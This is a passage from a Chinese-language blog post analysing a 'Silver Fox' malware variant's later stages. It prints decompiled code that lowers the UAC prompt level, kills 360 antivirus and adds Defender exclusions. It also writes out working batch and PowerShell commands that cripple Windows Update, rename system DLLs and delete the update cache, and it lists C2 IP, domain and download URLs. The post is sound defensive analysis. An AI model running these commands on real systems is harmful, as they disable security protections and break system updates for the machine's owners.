<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Main behavior orchestrator: sets UAC-related policy and spawns multiple malicious worker threads.</span></span><br><span class="line"><span class="type">int</span> __stdcall <span class="title function_">malware_main_thread_orchestrator</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  HANDLE th_kill_360_windows; <span class="comment">// eax</span></span><br><span class="line">  HANDLE Thread; <span class="comment">// eax</span></span><br><span class="line">  HANDLE th_watchdog_360tray; <span class="comment">// eax</span></span><br><span class="line">  HANDLE th_watchdog_360safe; <span class="comment">// eax</span></span><br><span class="line">  HANDLE th_disable_update; <span class="comment">// eax</span></span><br><span class="line">  HKEY h_system_policy_key; <span class="comment">// [esp+0h] [ebp-Ch] BYREF</span></span><br><span class="line">  BYTE zero_dword[<span class="number">4</span>]; <span class="comment">// [esp+4h] [ebp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *(_DWORD *)zero_dword = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !RegOpenKeyExA(</span><br><span class="line">          HKEY_LOCAL_MACHINE,</span><br><span class="line">          <span class="string">&quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System&quot;</span>,</span><br><span class="line">          <span class="number">0</span>,</span><br><span class="line">          <span class="number">2u</span>,</span><br><span class="line">          &amp;h_system_policy_key) )</span><br><span class="line">  &#123;</span><br><span class="line">    RegSetValueExA(h_system_policy_key, <span class="string">&quot;ConsentPromptBehaviorAdmin&quot;</span>, <span class="number">0</span>, <span class="number">4u</span>, zero_dword, <span class="number">4u</span>);</span><br><span class="line">    RegCloseKey(h_system_policy_key);</span><br><span class="line">  &#125;</span><br><span class="line">  th_kill_360_windows = CreateThread(<span class="number">0</span>, <span class="number">0</span>, kill_360_tray_window_loop, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( th_kill_360_windows )</span><br><span class="line">    CloseHandle(th_kill_360_windows);</span><br><span class="line">  Thread = CreateThread(<span class="number">0</span>, <span class="number">0</span>, process_hunt_download_and_install_ranchserv, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( Thread )</span><br><span class="line">    CloseHandle(Thread);</span><br><span class="line">  th_watchdog_360tray = CreateThread(<span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)watchdog_kill_360tray_thread, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( th_watchdog_360tray )</span><br><span class="line">    CloseHandle(th_watchdog_360tray);</span><br><span class="line">  th_watchdog_360safe = CreateThread(<span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)watchdog_kill_360safe_thread, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( th_watchdog_360safe )</span><br><span class="line">    CloseHandle(th_watchdog_360safe);</span><br><span class="line">  <span class="keyword">if</span> ( check_defender_exclusion_contains_path(<span class="string">L&quot;C:\\ProgramData&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    Sleep(<span class="number">0x3E8u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    Sleep(<span class="number">0x7530u</span>);</span><br><span class="line">    ShellExecuteA(</span><br><span class="line">      <span class="number">0</span>,</span><br><span class="line">      <span class="string">&quot;open&quot;</span>,</span><br><span class="line">      <span class="string">&quot;powershell.exe&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Add-MpPreference -ExclusionPath &#x27;C:\\ProgramData&#x27;,&#x27;C:\\Users&#x27;,&#x27;C:\\Program Files (x86)&#x27; -Force&quot;</span>,</span><br><span class="line">      <span class="number">0</span>,</span><br><span class="line">      <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  SwitchToThread();</span><br><span class="line">  CreateThread(<span class="number">0</span>, <span class="number">0</span>, add_defender_exclusion_via_schtasks_thread, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  th_disable_update = CreateThread(<span class="number">0</span>, <span class="number">0</span>, disable_windows_update_stack_thread, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( th_disable_update )</span><br><span class="line">    CloseHandle(th_disable_update);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>watchdog_kill_360tray_thread</code>和 <code>watchdog_kill_360safe_thread</code>都调用 <code>GetTcpTable2</code> 获取当前系统所有的 TCP 连接状态表，通过调用 <code>SetTcpEntry</code> 传入这个状态为 12 的条目 <code>MIB_TCP_STATE_DELETE_TCB</code>（删除传输控制块）， 系统会立刻强制断开这条 TCP 连接。</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771592904016.png" alt="1771592904016"></p>
<p><code>check_defender_exclusion_contains_path(L&quot;C:</code></p>
<p>打开注册表键 (RegOpenKeyExW) <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths</code> 并枚举注册表值 (RegEnumValueW)</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771593210174.png" alt="1771593210174"></p>
<p><code>add_defender_exclusion_via_schtasks_thread</code></p>
<p>它利用 <code>cmd.exe /c SCHTASKS /Create ... /RU &quot;SYSTEM&quot; /RL HIGHEST</code> 创建一个名为 Task1 的临时系统最高权限计划任务。</p>
<p>该任务执行的具体命令是强行修改注册表：<code>reg add &quot;HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths&quot; /v &quot;目标路径&quot; /t REG_DWORD /d 0 /f</code>。</p>
<p>它执行该任务后立即将其删除。通过这种循环，它一口气把样本自身目录、<code>C:\ProgramData</code>、<code>C:\Users</code>、<code>C:\Program Files (x86)</code> 和用户的文档目录全部加进了 Defender 的白名单。</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771593452447.png" alt="1771593452447"></p>
<p><code>disable_windows_update_stack_thread</code>瘫痪windows系统更新</p>
<p>禁用核心更新服务，停止这些服务 -&gt; 将启动类型设为“禁用” -&gt; 清空服务的崩溃恢复动作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for %i in (wuauserv UsoSvc uhssvc WaaSMedicSvc) do (</span><br><span class="line">    net stop %i</span><br><span class="line">    sc config %i start= disabled</span><br><span class="line">    sc failure %i reset= 0 actions= &quot;&quot;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>物理破坏系统核心 DLL</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for %i in (WaaSMedicSvc wuaueng) do (</span><br><span class="line">    takeown /f C:\Windows\System32\%i.dll</span><br><span class="line">    icacls C:\Windows\System32\%i.dll /grant *S-1-1-0:F</span><br><span class="line">    rename C:\Windows\System32\%i.dll %i_BAK.dll</span><br><span class="line">    icacls C:\Windows\System32\%i_BAK.dll /setowner &quot;NT SERVICE\TrustedInstaller&quot;</span><br><span class="line">    icacls C:\Windows\System32\%i_BAK.dll /remove *S-1-1-0</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>注册表与组策略硬编码锁定</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Services\WaaSMedicSvc&quot; /v Start /t REG_DWORD /d 4 /f</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Services\WaaSMedicSvc&quot; /v FailureActions /t REG_BINARY /d 0000... /f</span><br><span class="line">reg add &quot;HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU&quot; /v NoAutoUpdate /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>

<p>彻底清空更新缓存目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">erase /f /s /q c:\windows\softwaredistribution\*.*</span><br><span class="line">rmdir /s /q c:\windows\softwaredistribution</span><br></pre></td></tr></table></figure>

<p>跨入 PowerShell 猎杀计划任务，所有定时任务全部禁用</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-NoProfile</span> <span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span> <span class="literal">-Command</span> <span class="string">&quot;&amp; &#123;</span></span><br><span class="line"><span class="string">    Get-ScheduledTask -TaskPath &#x27;\Microsoft\Windows\InstallService\*&#x27; | Disable-ScheduledTask ...;</span></span><br><span class="line"><span class="string">    Get-ScheduledTask -TaskPath &#x27;\Microsoft\Windows\UpdateOrchestrator\*&#x27; | Disable-ScheduledTask ...;</span></span><br><span class="line"><span class="string">    Get-ScheduledTask -TaskPath &#x27;\Microsoft\Windows\UpdateAssistant\*&#x27; | Disable-ScheduledTask ...;</span></span><br><span class="line"><span class="string">    Get-ScheduledTask -TaskPath &#x27;\Microsoft\Windows\WaaSMedic\*&#x27; | Disable-ScheduledTask ...;</span></span><br><span class="line"><span class="string">    Get-ScheduledTask -TaskPath &#x27;\Microsoft\Windows\WindowsUpdate\*&#x27; | Disable-ScheduledTask ...;</span></span><br><span class="line"><span class="string">    Get-ScheduledTask -TaskPath &#x27;\Microsoft\WindowsUpdate\*&#x27; | Disable-ScheduledTask ...;</span></span><br><span class="line"><span class="string">&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/image/2026-02-12-malware_analysis_2/1771593562791.png" alt="1771593562791"></p>
<p><code>decode_thumbs_db_and_reflective_load_payload</code>读取当前目录 <code>thumbs.db</code>，解密后内存反射加载，按导出名 <code>Edge</code> 解析并调用导出函数。</p>
<h3 id="stage-7"><a href="#stage-7" class="headerlink" title="stage 7"></a>stage 7</h3><p>该阶段载荷本质上是一个完整的远控木马</p>
<p>Edge主函数会根据全局变量配置执行不同的C2方式，当前样本持续调用 <code>ensure_single_instance_and_launch_workers</code></p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771596278743.png" alt="1771596278743"></p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771594933551.png" alt="1771594933551"></p>
<p>该函数创建互斥 <code>LJPXYXC</code>后启动两条核心 C2 线程</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771595081877.png" alt="1771595081877"></p>
<h4 id="C-C信息"><a href="#C-C信息" class="headerlink" title="C&amp;C信息"></a>C&amp;C信息</h4><p>主 IP：8.218.220.211，端口：8379</p>
<p>次级域名：aceqqj.net，端口：9011</p>
<p>http:&#x2F;&#x2F;%s&#x2F;ip.txt（用于刷新&#x2F;更新目标）</p>
<p>http:&#x2F;&#x2F;%s&#x2F;%d.dll（拉取模块）</p>
<p>http:&#x2F;&#x2F;%s&#x2F;upx.rar（拉取压缩包&#x2F;组件）</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/categories/">Category</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/friends/">friends</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%8C%E6%95%B4%E7%9A%84%E2%80%9D%E9%93%B6%E7%8B%90%E2%80%9D%E6%A0%B7%E6%9C%AC%E5%8F%98%E7%A7%8D%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">记一次完整的”银狐”样本变种分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%83%E6%95%B0%E6%8D%AE"><span class="toc-number">1.1.</span> <span class="toc-text">元数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">分析过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#stage-0"><span class="toc-number">1.2.1.</span> <span class="toc-text">stage 0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stage-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">stage 1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%9D%83%E9%99%90%E5%B9%B6%E5%B0%9D%E8%AF%95%E9%80%9A%E8%BF%87%E5%BC%B9%E7%AA%97%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">查询权限并尝试通过弹窗提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%8D%E6%B2%99%E7%AE%B1"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">反分析与反沙箱</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E6%A3%80%E6%9F%A5"><span class="toc-number">1.2.2.2.1.</span> <span class="toc-text">时间检查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95"><span class="toc-number">1.2.2.2.2.</span> <span class="toc-text">内存压力测试</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#API%E7%89%B9%E5%BE%81%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.2.2.2.3.</span> <span class="toc-text">API特征探测</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%B5%8B%E8%AF%95"><span class="toc-number">1.2.2.2.4.</span> <span class="toc-text">其他测试</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E5%AF%86%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5%E6%A0%B7%E6%9C%AC"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">解密第二阶段样本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stage-2"><span class="toc-number">1.2.3.</span> <span class="toc-text">stage 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stage-3"><span class="toc-number">1.2.4.</span> <span class="toc-text">stage 3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%88%86%E6%9E%90%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">反分析初始化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E6%A3%80%E6%9F%A5"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">内存检查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E6%B2%99%E7%AE%B1%E6%A3%80%E6%9F%A5"><span class="toc-number">1.2.4.3.</span> <span class="toc-text">反沙箱检查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MakeVirus%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.4.4.</span> <span class="toc-text">MakeVirus流程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E5%AF%B9%E6%8A%97"><span class="toc-number">1.2.4.4.1.</span> <span class="toc-text">安全软件对抗</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0"><span class="toc-number">1.2.4.4.2.</span> <span class="toc-text">文件落地</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E4%B8%8E%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">1.2.4.4.3.</span> <span class="toc-text">运行与持久化</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.2.4.4.3.1.</span> <span class="toc-text">创建计划任务</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%A0%E9%BB%91%E5%90%8D%E5%8D%95%E8%BF%9B%E7%A8%8B%E6%97%B6%E7%9A%84%E5%88%86%E6%94%AF%E8%B7%AF%E5%BE%84"><span class="toc-number">1.2.4.4.4.</span> <span class="toc-text">无黑名单进程时的分支路径</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E7%99%BD%E5%90%8D%E5%8D%95%E7%9B%AE%E5%BD%95"><span class="toc-number">1.2.4.4.4.1.</span> <span class="toc-text">添加白名单目录</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1-1"><span class="toc-number">1.2.4.4.4.2.</span> <span class="toc-text">创建计划任务</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stage-4"><span class="toc-number">1.2.5.</span> <span class="toc-text">stage 4</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DLL%E4%BE%A7%E8%BD%BD%EF%BC%88%E7%99%BD-%E9%BB%91%EF%BC%89"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">DLL侧载（白+黑）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#vdi-ipc%E8%BD%BD%E8%8D%B7"><span class="toc-number">1.2.5.2.</span> <span class="toc-text">vdi_ipc载荷</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E7%BA%A7%E5%B9%B2%E6%8E%89%E6%9D%80%E8%BD%AF"><span class="toc-number">1.2.5.2.1.</span> <span class="toc-text">内核级干掉杀软</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">1.2.5.2.2.</span> <span class="toc-text">远程文件读取</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stage-5"><span class="toc-number">1.2.6.</span> <span class="toc-text">stage 5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stage6"><span class="toc-number">1.2.7.</span> <span class="toc-text">stage6</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DLL%E4%BE%A7%E8%BD%BD%EF%BC%88%E7%99%BD-%E9%BB%91%EF%BC%89-1"><span class="toc-number">1.2.7.1.</span> <span class="toc-text">DLL侧载（白+黑）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%AEshellcode"><span class="toc-number">1.2.7.2.</span> <span class="toc-text">内置shellcode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84dll%E8%BD%BD%E8%8D%B7"><span class="toc-number">1.2.7.3.</span> <span class="toc-text">反射dll载荷</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stage-7"><span class="toc-number">1.2.8.</span> <span class="toc-text">stage 7</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#C-C%E4%BF%A1%E6%81%AF"><span class="toc-number">1.2.8.1.</span> <span class="toc-text">C&amp;C信息</span></a></li></ol></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://exploo0osion.github.io/2026/02/12/2026-02-12-malware_analysis_2/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://exploo0osion.github.io/2026/02/12/2026-02-12-malware_analysis_2/&text=记一次完整的银狐样本变种分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://exploo0osion.github.io/2026/02/12/2026-02-12-malware_analysis_2/&title=记一次完整的银狐样本变种分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://exploo0osion.github.io/2026/02/12/2026-02-12-malware_analysis_2/&is_video=false&description=记一次完整的银狐样本变种分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=记一次完整的银狐样本变种分析&body=Check out this article: https://exploo0osion.github.io/2026/02/12/2026-02-12-malware_analysis_2/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://exploo0osion.github.io/2026/02/12/2026-02-12-malware_analysis_2/&title=记一次完整的银狐样本变种分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://exploo0osion.github.io/2026/02/12/2026-02-12-malware_analysis_2/&title=记一次完整的银狐样本变种分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://exploo0osion.github.io/2026/02/12/2026-02-12-malware_analysis_2/&title=记一次完整的银狐样本变种分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://exploo0osion.github.io/2026/02/12/2026-02-12-malware_analysis_2/&title=记一次完整的银狐样本变种分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://exploo0osion.github.io/2026/02/12/2026-02-12-malware_analysis_2/&name=记一次完整的银狐样本变种分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://exploo0osion.github.io/2026/02/12/2026-02-12-malware_analysis_2/&t=记一次完整的银狐样本变种分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2025-2026
    Exploooosion
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/friends/">friends</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
